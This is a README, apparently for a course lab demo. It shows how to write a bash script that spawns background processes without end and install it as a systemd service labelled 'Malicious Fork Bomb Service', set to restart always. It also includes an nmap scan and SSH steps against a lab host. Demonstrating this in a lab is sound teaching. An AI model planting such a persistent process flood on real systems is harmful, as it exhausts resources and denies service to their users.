# Fork Bomb Demo

This demo showcases the setup and execution of a fork bomb on a remote machine. The fork bomb script is installed as a systemd service and runs under the demo user.

## Prerequisites

- SSH access to the target machine (ST24-401D) with user `cs401`.
- `sudo` privileges on the target machine.
- Basic understanding of systemd services and bash scripting.

## Steps

1. **Login to the Target Machine**

    Use SSH to log in to the target machine with the `cs401` user.

    ```bash
    ssh cs401@ST24-401D
    ```

1. **Run a Port Scan**

    Perform a port scan on the target machine to identify open ports.

    ```bash
    sudo nmap -p 1-30 10.10.248.158
    ```

1. **SSH into the Target Machine as the Demo User**

    Switch to the demo user on the target machine.

    ```bash
    ssh demo@10.10.248.158
    ```

1. **Create the Fork Bomb Script**

    Create a bash script that continuously spawns child processes.

    ```bash
    sudo touch /usr/local/bin/fork_bomb.sh
    ```

    ```bash
    sudo tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
    #!/bin/bash

    create_child_process() {
        sleep 9999 &
        child_pid=\$!
        echo "Created child process with PID: \$child_pid"
    }

    trap 'kill \$(jobs -p); exit' SIGINT SIGTERM

    while true
    do
        for i in \$(seq 1 10);
        do
            create_child_process
        done
        sleep 2
    done
    EOF
    ```

1. **Make the Script Executable and Set Ownership**

    Grant execute permissions to the script and change its ownership to the demo user.

    ```bash
    sudo chmod +x /usr/local/bin/fork_bomb.sh
    ```

    ```bash
    sudo chown demo: /usr/local/bin/fork_bomb.sh
    ```

1. **Create a systemd Service for the Fork Bomb**

    Set up a systemd service to manage the fork bomb script.

    ```bash
    sudo touch /etc/systemd/system/fork.service
    ```

    ```bash
    sudo tee /etc/systemd/system/fork.service > /dev/null << EOF
    [Unit]
    Description=Malicious Fork Bomb Service
    After=network.target

    [Service]
    ExecStart=/usr/local/bin/fork_bomb.sh
    ExecStop=/bin/kill -s SIGTERM \$MAINPID
    Restart=always
    User=demo
    KillMode=process
    Type=simple

    [Install]
    WantedBy=multi-user.target
    EOF
    ```

1. **Reload systemd and Start the Fork Bomb Service**

    Reload systemd to recognize the new service and then start the fork bomb.

    ```bash
    sudo systemctl daemon-reload
    ```

    ```bash
    sudo systemctl start fork.service
    ```
